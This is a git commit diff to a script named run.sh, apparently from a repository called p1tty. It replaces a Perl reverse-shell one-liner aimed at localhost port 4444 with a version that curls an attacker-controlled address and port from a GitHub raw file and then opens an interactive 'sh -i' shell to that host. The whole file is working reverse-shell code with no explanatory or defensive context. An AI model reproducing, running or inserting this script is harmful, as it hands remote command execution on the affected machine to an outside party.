57bb039036dc8cff89c66741427257247d68ba7a
ur4nd0m <121455698+ur4nd0m@users.noreply.github.com>
2022-12-26 19:16:41 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,6 @@
-perl -e 'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+#!/bin/bash
+addr=`curl https://raw.githubusercontent.com/ur4nd0m/p1tty/main/connect`
+array=(`echo $addr | tr ':' ' '`)
+export url=${array[0]}
+export port=${array[1]}
+perl -e 'use Socket;$i="$ENV{url}";$p=$ENV{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
